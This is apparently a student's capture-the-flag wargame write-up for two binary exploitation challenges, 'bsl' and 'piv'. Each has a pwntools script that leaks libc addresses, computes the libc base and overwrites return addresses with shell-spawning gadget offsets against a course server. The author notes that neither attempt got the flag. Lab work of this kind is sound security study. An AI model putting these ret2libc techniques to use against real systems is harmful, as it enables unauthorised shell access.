# z5214048
## Wargame 8


bsl 
===========================

Flag: Not obtained

General overview of problems faced
-------------------------------------
1. Rop gadget -> no "int 0x80"
2. IDA -> No win function

So what do we do? Rop2Libc, right?
1. Program leaks puts(*puts()) , of which the latter hex-digits yield 100% that libc used on the server is: libc6_2.27-3ubuntu1_i386
2. Calculate libc base address, add the potential /bin/sh gadgets, and we're done, right?
3. Try simple ROP back to main() -> wtf? How does this program even work
3.1 Pardon my French, but while figured out libc version and the strategy, how do I rop? Seemingly, in least_fav(), the behaviour is really weird and changes all the time as I enter new data and/or change my favourite number

Script/Command used
------------------
```
#python2
from pwn import *

context.binary = './bsl'

io = process("./bsl")
#io = remote("plzpwn.me", 8001)

print(io.recvuntil("Will you be my friend? (y/n)"))
io.sendline("y")

"""     printf(
      "Since we are now besties, we need to know each others most and least favourite things. I'll start!\n"
      "I absolutely LOVE numbers! They are all I can think about! My current favourite is: %p\n",
      &puts);
"""

print(io.recvuntil("I absolutely LOVE numbers! They are all I can think about! My current favourite is:"))
addr_puts = io.recvline().strip()
print("[] addr_puts: "+addr_puts)
# 0xf75a5b40

# """ ============================Most fav=============================="""

print(io.recvuntil("Do you want to learn an interesting fact about a number? (y/n)"))
io.sendline("y")

"""
  char buf1[1337]; // [esp+7h] [ebp-541h]
  ...
  if ( get_answer() )
  most_fav(buf1);
    ...
    puts("Zero... The first number I ever learnt, and the number of besties I had before I met you!");
    puts("Now it's your turn to tell me an interesting number fact!");
    fgets(buf1, 1336, stdin);
"""

print(io.recvuntil("Whats your favourite number?"))
io.sendline("0")

print(io.recvuntil("Zero... The first number I ever learnt, and the number of besties I had before I met you!"))
print(io.recvuntil("your turn to tell me an interesting number fact!"))

print("[] Sending wtf1")
# 7 x 191 = 1337
wtf_buffer1 = cyclic(512) # 1337
io.sendline(wtf_buffer1)
print("[] Sending wtf1 done")


# """ ============================Least fav II =============================="""

"""
  char buf2[200]; // [esp+8h] [ebp-D0h]

  printf("Mine is: %p\nWhats yours?\n", get_number);
  num = get_number();
  printf("Oh you don't like the number %d? Why not?\n", num);
  fgets(buf2, 209, stdin);
  if ( num == 1 )
    result = 6447;
  else
    result = 0;
"""

io.recvuntil("Do you have a LEAST favourite number? (y/n)")
io.sendline("y")

print(io.recvuntil("Mine is:"))
addr_get_number = io.recvline().strip()
print("[]addr_get_number : "+addr_get_number)
print(io.recvuntil("Whats yours?"))

# COMP6451 = bloody bitcoin/ethereum madness. Totally recommend after 6447 10/10
wtf_buffer2 = "6451" 
io.sendline(wtf_buffer2)

print(io.recvuntil("Why not?"))

# =======================Gen payload==============================


ida_getnumber = 0x00000713	
ida_fav = 0x000008B7
ida_relative_fav_push_puts = ida_fav + 0x7B

libc6_2273ubuntu1_i386_offset_puts = 0x00067b40

libc_base = int(addr_puts, 16) - libc6_2273ubuntu1_i386_offset_puts
libc_okbinsh = libc_base + 0x137e5e

print("libc_base : "+str(hex(libc_base)))
print("libc_okbinsh : "+str(hex(libc_okbinsh)))

buf = int(addr_get_number,16)

print("buf: "+str(hex(buf)))
buf = str(p32(buf))

pay1 = ""
pay1 += p32(libc_okbinsh)*53

print("Pay len: "+str(len(pay1)))
io.sendline(pay1)

io.interactive()

"""
ROP pointers
"""



```
Also 
```
gdb ./bsl
b *(least_fav+0x78)
run
```

piv
===============

Flag: not obtained (also)



General overview of problems faced
-------------------------------------
1. Rop gadget -> no "int 0x80"
2. IDA -> No win function

So what do we do? Rop2Libc, right?
1. Program leaks puts(*printf()) , of which the latter hex-digits yield 3 possible libc()'s'
2. Try ROP -> success
3. Calculate libc base addresses, add the potential /bin/sh gadgets, and we're done, right?
3.1 Try different bin/sh's and different libc()'s both offline and online -> no luck. Am I miscalculating something?

Script/Command used
------------------

```
#python2
from pwn import *

context.binary = './piv_it'

#io = process("./piv_it")
io = remote("plzpwn.me", 8002)

print("[]Waiting for ROOTURPC")
io.recvuntil("rm -rf /")
print("[]Waiting done")

io.recvuntil("Unexpected Error Encountered At:")
addr_printf = io.recvline().strip()
addr_printf_int = int(addr_printf,16)
print("[!]addr_printf: ["+addr_printf+"]")

"""
0xf75d72d0
0xf75c52d0
"""

"""
libc6-amd64_2.21-0ubuntu4.3_i386
libc6-i386_2.10.1-0ubuntu19_amd64
libc6_2.27-3ubuntu1_i386
"""

io.recvuntil("Manual Override Initiated")
io.recvuntil("$")
wtf_buffer1 = "6447"
io.sendline(wtf_buffer1)

"""
IDA
main	00000725	
0000302C		__libc_start_main	
__libc_csu_init	00000950	
"""

io.recvuntil("Unexpected Error Encountered At: ")
addr_main = io.recvline().strip()
print("[!]addr_main: ["+addr_main+"]")
addr_main_int = int(addr_main,16)

io.recvuntil("Safe Mode Enabled")
io.recvuntil("$")

ida_main = 0x00000725
###########
plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_offset_printf = 0x000000000004f2d0

plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_binsh1 = 0x3f856 
plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_binsh2 = 0x3f8aa 
plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_binsh3 = 0xd6f2d 
#############
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_offset_printf = 0x000472d0

plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh1 = 0x392b4 
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh2 = 0x5e38b 
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh3 = 0x5e391 
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh4 = 0x5e395 
##############
plshaq_libc6_2_27_3ubuntu1_i386_offset_printf = 0x000512d0

plshaq_libc6_2_27_3ubuntu1_i386_binsh1 = 0x3d0d3 
plshaq_libc6_2_27_3ubuntu1_i386_binsh2 = 0x3d0d5 
plshaq_libc6_2_27_3ubuntu1_i386_binsh3 = 0x3d0d9 
plshaq_libc6_2_27_3ubuntu1_i386_binsh4 = 0x3d0e0 
plshaq_libc6_2_27_3ubuntu1_i386_binsh5 = 0x67a7f 
plshaq_libc6_2_27_3ubuntu1_i386_binsh6 = 0x67a80 
plshaq_libc6_2_27_3ubuntu1_i386_binsh7 = 0x137e5e 
plshaq_libc6_2_27_3ubuntu1_i386_binsh8 = 0x137e5f 
##############

# Anyway
real_elf_base = addr_main_int - ida_main

pay = ""
#   char buf[20]; // [esp+Ch] [ebp-1Ch]
pay += "A"*20
pay += "BBBB"*3 # not too sure why

#   read(0, buf, 0x38u);
# 1. 0x38u = 56
# 2. 56-20-12=36-12=24 
# 3. 24 / sizeof str for 32bit = 24 / 4 = 6 addresses long ROP

plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_base = addr_printf_int - plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_offset_printf
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_base = addr_printf_int - plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_offset_printf
plshaq_libc6_2_27_3ubuntu1_i386_base = addr_printf_int - plshaq_libc6_2_27_3ubuntu1_i386_offset_printf

print("supposed libc base 1: "+hex(plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_base))
print("supposed libc base 2: "+hex(plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_base))
print("supposed libc base 3: "+hex(plshaq_libc6_2_27_3ubuntu1_i386_base))

"""
 EAX  0x0
 EBX  0x0
 ECX  0xffffd510  0x1
 EDX  0xf7fb1890x(_IO_stdfile_1_lock)  0x0
 EDI  0x0
 ESI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_)  0x1d7d6c
 EBP  0x0
 ESP  0xffffd4fc 0xf7df0e81 (__libc_start_main+241) add    esp, 0x10
 EIP  0x5655593f (main+538)  lea esp, [ecx - 4]
"""

pay += str(p32(plshaq_libc6_2_27_3ubuntu1_i386_base+plshaq_libc6_2_27_3ubuntu1_i386_binsh8))*6
"""
binsh   return
1   -11
2   -11
3   -11 (but weird)
4   -11
5   127
6   127
7   127
8   127
"""

print("pay: ["+pay+"]")
print("pay len: "+str(len(pay)))

io.sendline(pay)
io.interactive()
```